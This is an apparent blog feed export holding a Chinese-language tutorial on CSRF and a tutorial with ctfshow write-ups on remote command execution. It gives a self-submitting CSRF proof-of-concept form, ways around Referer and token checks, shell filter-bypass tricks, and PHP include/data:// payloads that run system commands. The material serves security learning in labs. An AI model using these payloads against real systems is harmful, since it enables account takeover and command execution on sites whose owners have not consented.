</span><br><span class="line">&lt;form action=&quot;https://vulnerable-website.com/email/change&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;pwned@evil-user.net&quot; /&gt; </span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>Poc保存为html文件，诱使受害者访问该文件，受害者在没有退出<a href="https://vulnerable-website.com这个网站的情况下,就会携带cookie向https//vulnerable-website.com/email/change%E6%8F%90%E4%BA%A4%E4%B8%80%E4%B8%AAPOST%E8%AF%B7%E6%B1%82%EF%BC%8C%E4%BF%AE%E6%94%B9%E9%82%AE%E7%AE%B1">https://vulnerable-website.com这个网站的情况下，就会携带Cookie向https://vulnerable-website.com/email/change提交一个POST请求，修改邮箱</a></p><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="GET型CSRF"><a href="#GET型CSRF" class="headerlink" title="GET型CSRF"></a>GET型CSRF</h3><p>受害者A（admin&#x2F;password）登录了网站，网站里有修改密码的功能</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726052046050-e8cf2b79-bd75-4bec-aa98-72b97df073a8.png"></p><p>攻击者B（smithy&#x2F;password）也登录网站获取网站里修改密码的参数，因为同样的网站同等级的用户里面的功能是一样的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</span><br></pre></td></tr></table></figure><p>攻击者在网站中修改密码，获取修改密码的参数，（由于是GET型，参数在URL中）将URL发送给受害者A，（如果网站中存在存储型XSS漏洞，还可以将链接插入进去），受害者在没有退出网站的情况下点击了链接，就会执行攻击者所想让他执行的操作，密码被无意修改了</p><blockquote><p>在测试的时候，如果在一台电脑自行测试，模拟攻击者和受害者使用不同浏览器</p></blockquote><h3 id="POST型CSRF"><a href="#POST型CSRF" class="headerlink" title="POST型CSRF"></a>POST型CSRF</h3><p>攻击者：</p><p>进行攻击操作（修改个人资料等）并抓包</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726052762878-4bcb8c80-55b9-4c46-af10-190c34ae6b40.png"></p><p>构造恶意请求</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726052844589-bee8f979-486f-4b24-852c-c9291d429eab.png"></p><p>copy生成的html，保存到一个文件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726052915671-6192bea7-b6b4-4237-94ac-eabb7bfc9cf6.png"></p><p>将文件发送给受害者，诱使受害者访问这个文件</p><p>当受害者登录了相同的网站，同时访问了这个文件，攻击就被执行，受害者的个人信息就被修改了</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ol><li>Referer检查。攻击者虽然是利用用户的请求进行访问，但是Referer的内容显示的是B网站，也就是攻击者自己构造的网站。如果对Referer进行白名单检查，看是否来自合法的网站。如果不是，就极有可能是CSRF攻击。</li><li>添加Token验证。CSRF攻击成功的原因就是利用用户已经认证过的cookie信息。cookie中的身份信息在请求时会自动添加，所以我们要在cookie外再加入一种验证身份的信息。具体的做法是在HTTP请求中，以参数的形式加入一个随机产生的Token，并在服务器端建立一个拦截器来验证这个Token，如果请求中没有Token或者Token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</li></ol><h2 id="XSS-CSRF组合拳"><a href="#XSS-CSRF组合拳" class="headerlink" title="XSS&amp;CSRF组合拳"></a>XSS&amp;CSRF组合拳</h2><blockquote><p>XSS可能在中低危，组合起来可能变成高危</p></blockquote><p>在XSS，如果网站设置了http-only就不能获取Cookie了，我们换种思路，不再去窃取用户的Cookie，而是直接利用它</p><p>例如：在存在XSS漏洞的A网站上注入一条链接 <a herf="http://xxx.xxxx.xxx/test.php?money=1111" />，当用户点击之后，进入攻击者提前写好的网站B，触发网站B中，例如<img src="http://网站A/test.php?Id=1&money=100000"/>这样的恶意代码，这时候由于用户带有A网站的认证信息，B网站利用用户此时的请求，篡改GET或POST表单内的参数，在用户不知情的情况下请求A网站，完成转账，修改密码等恶意操作。</p><blockquote><p>除了img标签之外，还可以使用各种可以使用src属性值的标签，比如：script标签、link标签等。</p></blockquote><h1 id="CSRF利用"><a href="#CSRF利用" class="headerlink" title="CSRF利用"></a>CSRF利用</h1><p>黑盒手工利用测试，白盒看代码检验（有无token，来源检验等）</p><p><a href="https://xz.aliyun.com/t/6176?time__1311=n4+xnD0DgDcDR77GOYD/ia4BKEmEcQCn7WmReD#toc-7">绕过CSRF防御 - 先知社区</a></p><h2 id="无防护情况下"><a href="#无防护情况下" class="headerlink" title="无防护情况下"></a>无防护情况下</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733576962221-6681b89a-ae6d-4961-b625-5fb6341a0f4b.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733576961956-ece3cc3b-bb68-41a6-8e4b-9821a5ab8852.png"></p><p>生成：BurpSuite-&gt;Engagement tools-&gt;Generate CSRF Poc</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733576962159-f4c3c8dc-4144-47c5-b408-f7591067aeb9.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733576962257-95952608-ff00-4027-984f-01a6775c05c7.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733576962218-72ffd38c-52ee-4240-99a9-020a5a90cdc0.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733576963098-ec4714a4-14e2-4e4e-a31f-d5fa31586941.png"></p><p>但是这不是我们想要的，我们想要的效果就是受害者一访问就会自动触发，还需要在修改下POC数据包</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733576963202-15249dae-afe0-4708-a20f-41f0cde97ccf.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733576963209-c7479da7-271c-4748-9605-775e6b8db61a.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733576963172-56d619da-0e60-4f76-8703-6119bf3b065f.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733576963348-3a580880-7ee5-49d3-9cf7-5247f43d841d.png"></p><p>利用：将文件放到自己的站点下，诱使受害者访问（或配合XSS触发访问）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733576963719-55f34fc4-87c6-49cc-855d-ceaee1e6772c.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733576964095-d5423b16-fed0-40df-baf6-f9c3a1850b65.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733576964285-19c0ebc8-ca4d-4723-b430-547f2798fe5d.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733576964291-d4a4c047-6faa-40ac-82f8-a67ec715a1cb.png"></p><h2 id="绕过Referer"><a href="#绕过Referer" class="headerlink" title="绕过Referer"></a>绕过Referer</h2><h3 id="绕过1：去掉Referer（代码逻辑问题）"><a href="#绕过1：去掉Referer（代码逻辑问题）" class="headerlink" title="绕过1：去掉Referer（代码逻辑问题）"></a>绕过1：去掉Referer（代码逻辑问题）</h3><p>在Poc中添加如下内容（目的是删除Referer请求头）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;no-referrer&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733577128429-1692b6a9-3e82-4941-b05a-aeda1ac5ef9f.png"></p><h3 id="绕过2：修改Referer（校验代码不严格）"><a href="#绕过2：修改Referer（校验代码不严格）" class="headerlink" title="绕过2：修改Referer（校验代码不严格）"></a>绕过2：修改Referer（校验代码不严格）</h3><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733577201865-d5a5932d-b318-4067-a852-6b1435bd343f.png" alt="校验源代码"></p><p>校验方式可能为：</p><p>完全匹配：referer被设定为某个特定值，不完全匹配则不接收数据包</p><p>模糊匹配：referer中只要含有某个特定值即可</p><p>可以尝试将Poc中的Referer的内容更改为测试网站的url</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733577303667-dbbe6399-a332-4dbb-aa72-91694fe209fe.png"></p><p>模糊匹配</p><p>绕过3：配合文件上传绕过</p><p>绕过4：配合存储XSS绕过</p><h2 id="绕过Token"><a href="#绕过Token" class="headerlink" title="绕过Token"></a>绕过Token</h2><blockquote><p>token(令牌,也可以理解为暗号,在数据传输之前，要先进行暗号的核对，暗号不一致则拒绝数据传输)</p><p>每次传递数据时，数据包会携带不同的Token，我们如果将含有Token的Poc发送给受害者，当受害者点击时，Poc中的Token失效，导致攻击不成功</p></blockquote><blockquote><p>CSRF_token 对关键操作增加Token参数，token必须随机，每次都不一样，存储在cookie中，与验证码一样</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733577698614-67e2d29c-6b1b-431f-b586-d6e50e70dc14.png"></p><h3 id="复用"><a href="#复用" class="headerlink" title="复用"></a>复用</h3><p>代码逻辑不严谨，Poc中的Token对于受害者来说仍然可以使用，Token作用没有被体现</p><p>操作和没有Token验证一样</p><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>将Token的整个值删掉</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733577807562-50a1f4ee-74f8-4a91-a60d-bb0877a2fab0.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733577812055-61f67582-5a65-47f3-89c0-c735906890fc.png"></p><h3 id="置空"><a href="#置空" class="headerlink" title="置空"></a>置空</h3><p>将Token的参数置空，保留Token&#x3D;</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733577831278-1535b4c4-40a2-4e37-9cde-f502914a4937.png"></p>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/2025/05/27/RCE/"/>
      <url>/2025/05/27/RCE/</url>
      
        <content type="html"><![CDATA[<p>远程命令执行&#x2F;远程代码执行</p><p>代码执行和命令执行可以互相转换</p><p>代码执行：</p><ol><li>脚本——java，php，python</li><li>产生——Web源码、中间件平台、其他环境</li><li>检测——白盒 代码审计</li><li>检测——黑盒 漏扫工具、公开漏洞、手工看参数及功能点</li><li>防御——敏感函数禁用、变量过滤或固定、WAF产品</li></ol><p>命令执行：</p><ol><li>系统——Linux、Windows</li><li>产生——web源码、中间件平台、其他环境</li><li>检测——白盒 代码审计</li><li>检测——黑盒 漏扫工具，公开漏洞，手工看参数及功能点</li><li>防御——敏感函数禁用、变量过滤或固定、WAF产品</li></ol><h1 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h1><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()、等</span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">system</span>()、<span class="keyword">exec</span>()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等</span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span> <span class="keyword">exec</span> subprocess os.system commands </span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">Java中没有类似php中<span class="keyword">eval</span>函数这种直接可以将字符串转化为代码执行的函数，</span><br><span class="line">但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等.</span><br></pre></td></tr></table></figure><blockquote><p>exec、shell_exec前面需要加echo</p></blockquote><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="关键字过滤-过滤-flag"><a href="#关键字过滤-过滤-flag" class="headerlink" title="关键字过滤 - 过滤 flag"></a>关键字过滤 - 过滤 flag</h2><h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">flag=fl*</span><br><span class="line">cat fl*</span><br><span class="line">cat ?la*</span><br></pre></td></tr></table></figure><h3 id="转义符号"><a href="#转义符号" class="headerlink" title="转义符号"></a>转义符号</h3><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">ca\t /fl\ag</span><br><span class="line">cat fl<span class="string">&#x27;&#x27;</span>ag</span><br></pre></td></tr></table></figure><h3 id="使用空变量∗-和-和∗和-，x-x-x-x-绕过"><a href="#使用空变量∗-和-和∗和-，x-x-x-x-绕过" class="headerlink" title="使用空变量∗ 和 *和∗和@，x , x,x,{x}绕过"></a>使用空变量∗ 和 *和∗和@，x , x,x,{x}绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ca$*t fl$*ag</span><br><span class="line">ca$@t fl$@ag</span><br><span class="line">ca$<span class="number">5</span>t f$<span class="number">5</span>lag</span><br><span class="line">ca$&#123;<span class="number">2</span>&#125;t f$&#123;<span class="number">2</span>&#125;lag</span><br></pre></td></tr></table></figure><blockquote><p>$x设置一个变量，但没有对变量赋值，为空，不影响前后命令执行</p></blockquote><h3 id="拼接法"><a href="#拼接法" class="headerlink" title="拼接法"></a>拼接法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=fl;b=ag;cat$IFS$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure><blockquote><p>${IFS}，Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。IFS环境变量定义了bash shell用户字段分隔符的一系列字符。默认情况下，bash shell会将下面的字符当做字段分隔符：空格、制表符、换行符。</p></blockquote><h3 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cat `ls`   <span class="comment">//在php中这个`反引号代表执行命令的意思</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733626144548-a16531bd-c204-40d7-a069-cd3972629c9d.png"></p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span> | base64<span class="comment">//获得flag的base64编码</span></span><br><span class="line">cat `<span class="keyword">echo</span> ZmxhZwo= | base64 -d`<span class="comment">//输出，并进行base64解码 -d表示解码，解码后为flag，相当于cat flag</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733626236975-1cfcebfb-83cb-4c3e-b20a-0fbbf47535aa.png"></p><h3 id="组合绝活"><a href="#组合绝活" class="headerlink" title="组合绝活"></a>组合绝活</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">touch <span class="string">&quot;ag&quot;</span></span><br><span class="line">touch <span class="string">&quot;fl\\&quot;</span></span><br><span class="line">touch <span class="string">&quot;t \\&quot;</span></span><br><span class="line">touch <span class="string">&quot;ca\\&quot;</span></span><br><span class="line">ls -t &gt;shell  <span class="comment">//-t是指以时间来展示文件</span></span><br><span class="line">sh shell</span><br><span class="line"><span class="comment">#  \指的是换行</span></span><br><span class="line"><span class="comment">#  ls -t是将文本按时间排序输出</span></span><br><span class="line"><span class="comment">#  ls -t &gt;shell  将输出输入到shell文件中</span></span><br><span class="line"><span class="comment">#  sh将文本中的文字读取出来执行</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733626671722-f09fda1e-c788-43d4-bce2-ea3537dfdd7a.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733626671741-c2f4cc9e-1029-4300-a263-903943b4f9f0.png"></p><h3 id="异或无符号（过滤0-9a-zA-Z）"><a href="#异或无符号（过滤0-9a-zA-Z）" class="headerlink" title="异或无符号（过滤0-9a-zA-Z）"></a>异或无符号（过滤0-9a-zA-Z）</h3><blockquote><p>复现不成功..</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733633927124-0f7d12fa-34f9-45c5-ada3-b852ba0fb225.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733635555894-e1263aeb-65e8-489a-baae-cf224f7ced0a.png"></p><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>rce-xor.php：</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733634080388-7e4a13f2-1627-4102-87b4-61483f0d08dc.png"></p><p>生成的txt内容就是异或得到字符</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733634172959-99a109c1-3c9e-4c57-9418-b62e9166e833.png"></p><p>rce-xor.py：构造payload</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733636265975-891ff4d3-8b5e-4359-a1da-a3e0f85d1e89.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733636265928-ab7275b0-0803-43ed-ba1f-9a664b75290a.png"></p><h4 id="或"><a href="#或" class="headerlink" title="或"></a>或</h4><p>rce-xor-or.php</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733636330001-aab2f459-ace7-46d2-a946-cb4c29b5dcd8.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733636329880-3c9a87a8-191a-44c3-9bc0-5771db1236ae.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733636330014-476be6e9-f9af-42a0-9888-92d2e98b325f.png"></p><p>rce-xor-or.py：构造payload</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733636346440-f844fdbe-d7a8-4edb-a631-f762a2152a94.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733636346393-f88a2c6a-9f34-4683-827c-98c38724d48f.png"></p><h2 id="过滤执行命令（如cat-tac等）"><a href="#过滤执行命令（如cat-tac等）" class="headerlink" title="过滤执行命令（如cat tac等）"></a>过滤执行命令（如cat tac等）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">sh /flag <span class="number">2</span>&gt;%<span class="number">261</span> <span class="comment">//报错出文件内容</span></span><br><span class="line">curl file:<span class="comment">///root/f/flag</span></span><br><span class="line">strings flag</span><br><span class="line">uniq -c flag</span><br><span class="line">bash -v flag</span><br><span class="line">rev flag</span><br></pre></td></tr></table></figure><h2 id="过滤执行空格"><a href="#过滤执行空格" class="headerlink" title="过滤执行空格"></a>过滤执行空格</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%<span class="number">09</span>（url传递）(cat%<span class="number">09</span>flag.php)<span class="comment">//%09是换行符的url编码</span></span><br><span class="line">cat$&#123;IFS&#125;flag</span><br><span class="line">a=fl;b=ag;cat$IFS$a<span class="variable">$b</span></span><br><span class="line">&#123;cat,flag&#125;</span><br></pre></td></tr></table></figure><blockquote><p>${IFS}，Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。IFS环境变量定义了bash shell用户字段分隔符的一系列字符。默认情况下，bash shell会将下面的字符当做字段分隔符：空格、制表符、换行符。</p></blockquote><h1 id="无回显利用"><a href="#无回显利用" class="headerlink" title="无回显利用"></a>无回显利用</h1><blockquote><p>大多数漏洞的无回显都是两种利用思路：带外和写文件</p></blockquote><h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>通过命令执行写个文件到当前目录下的x.txt中，再访问x.txt看看有无结果</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733627273987-2179d3a9-a186-4736-9675-cf1437c57e06.png"></p><h2 id="带外访问dnslog"><a href="#带外访问dnslog" class="headerlink" title="带外访问dnslog"></a>带外访问dnslog</h2><p>命令执行执行ping命令</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733627361122-1baff2bd-607e-44dd-8fbb-e969d16582c4.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733627361350-92ffbd6e-d324-4e19-9edd-b48bfd83325c.png"></p><h1 id="白盒-CTFshow"><a href="#白盒-CTFshow" class="headerlink" title="白盒-CTFshow"></a>白盒-CTFshow</h1><h2 id="29-通配符绕过"><a href="#29-通配符绕过" class="headerlink" title="29-通配符绕过"></a>29-通配符绕过</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733748815656-016e931d-e30b-4c0f-9c20-cf381c6f804c.png"></p><p>c参数GET型传参</p><p>过滤flag关键字</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&#x27;ls&#x27;);</span><br><span class="line">?c=system(&#x27;tac fl*.php&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733748862733-ace517ee-de95-430d-a3c6-f566ff40f517.png"></p><h2 id="30-system被过滤，使用exec"><a href="#30-system被过滤，使用exec" class="headerlink" title="30-system被过滤，使用exec"></a>30-system被过滤，使用exec</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733748931959-86b50e6e-46f9-4058-b43f-ac2b4e4acaea.png"></p><p>system被过滤</p><p>使用exec</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo shell_exec(&#x27;tac fl*&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733750733153-31c4b1dd-194a-4969-b513-785aee40d413.png"></p><h2 id="31-参数逃逸"><a href="#31-参数逃逸" class="headerlink" title="31-参数逃逸"></a>31-参数逃逸</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733750939122-ff9f043d-eebf-4c93-aa71-9c0f2a075f4d.png"></p><p>仍然是过滤system等，shell也被过滤</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval($_GET[a]);&amp;a=system(&#x27;tac flag.php&#x27;);  //为什么这样写，因为代码只检测参数c</span><br></pre></td></tr></table></figure><p>代码只检测过滤c的内容，我们将命令执行的结果赋值给变量a，再将a传递过去进行eval代码执行，将执行结果给c，c传递到服务器代码执行</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733751357162-0ca7b2d7-d5ef-4b70-964a-3504f2caf0e3.png"></p><h2 id="32-36-结合文件包含使用"><a href="#32-36-结合文件包含使用" class="headerlink" title="32-36-结合文件包含使用"></a>32-36-结合文件包含使用</h2><h3 id="32"><a href="#32" class="headerlink" title="32"></a>32</h3><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733799255311-b6bd350b-5af4-4a81-81eb-12f709601c1d.png"></p><p>分号也被过滤，不能参数逃逸</p><p>手动添加include，联合文件包含，使用伪协议</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php include &quot;xx.xx&quot;;?&gt; 这种是包含指定页面，不存在文件包含漏洞</span><br><span class="line">&lt;?php include $_GET[x];?&gt; 这种通过动态变量的传参才存在文件包含漏洞</span><br></pre></td></tr></table></figure><p>因为空格，单引号被过滤</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?=system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733801143560-b7b22b2c-b8aa-4c92-8202-00c2c466dede.png"></p><h3 id="33"><a href="#33" class="headerlink" title="33"></a>33</h3><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733918520957-62a30378-b12d-44f3-970e-9825ffe9be46.png"></p><p>又加了(和”的过滤，继续使用文件包含</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?=system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733919196865-142c117a-89aa-491e-b012-846b5bc40d01.png"></p><h3 id="34"><a href="#34" class="headerlink" title="34"></a>34</h3><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733919665299-c0e6ad0b-ab04-4783-95bc-2320be98abfa.png"></p><p>:也被过滤了，继续文件包含</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733919642507-b1b6ff1f-4f99-421e-9f58-24156dbff2a7.png"></p><h3 id="35"><a href="#35" class="headerlink" title="35"></a>35</h3><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733920328935-6d91dea9-a1d2-4247-ad2a-75fdcb1281aa.png"></p><p>&lt;和&#x3D;也被过滤了，继续文件包含</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733920362160-525f5da1-bcf2-4d7f-8b2e-24e4b38618e0.png"></p><h3 id="36"><a href="#36" class="headerlink" title="36"></a>36</h3><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733920473295-09893856-ea43-492d-b156-cc433d8b46a7.png"></p><p>&#x2F;和数字0-9也被过滤，继续文件包含</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733920509626-f5e9cbb8-0804-40f8-8199-0511e5fa71f8.png"></p><h2 id="37-文件包含"><a href="#37-文件包含" class="headerlink" title="37-文件包含"></a>37-文件包含</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733920571194-aec04462-1a08-48e0-8262-07c88b06083e.png"></p><p>如果c中没有flag字样，就对c进行文件包含，有include，直接php伪协议，对flag过滤了，使用通配符绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&#x27;tac fl*.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733920979336-3b4b0eba-0839-4efe-b800-fc6e4d08887e.png"></p><p>还可以用data的base64绕过</p><h2 id="38"><a href="#38" class="headerlink" title="38-"></a>38-</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733921515237-fb8d57d1-bb3b-4358-9631-c0953a2e506b.png"></p><p>php也被过滤，换种写法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?=system(&#x27;tac fl*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733921553313-d84cca2f-8490-4456-bd9c-2373f19a5257.png"></p><p>同样也可以使用data-base64</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733921683141-ad7fdaeb-f66e-4243-9cb4-f431dee69bdb.png"></p><h2 id="39"><a href="#39" class="headerlink" title="39"></a>39</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733921753219-3c6f9510-3133-4137-8031-276c7538c281.png"></p><p>在文件包含时强行加了后缀，但是这里没有影响，继续使用伪协议</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733922010352-a5fe72fb-e8c2-44b5-b212-e2443c9ae4a4.png"></p><blockquote><p>为什么没有影响呢？?&gt;已经闭合PHP语句？</p></blockquote><h2 id="40-无符号payload"><a href="#40-无符号payload" class="headerlink" title="40-无符号payload"></a>40-无符号payload</h2><p><a href="https://www.cnblogs.com/aninock/p/15125215.html">ctfshow-web入门命令执行-web40&#x2F;web41(附python脚本) - Aninock - 博客园</a></p><p><img 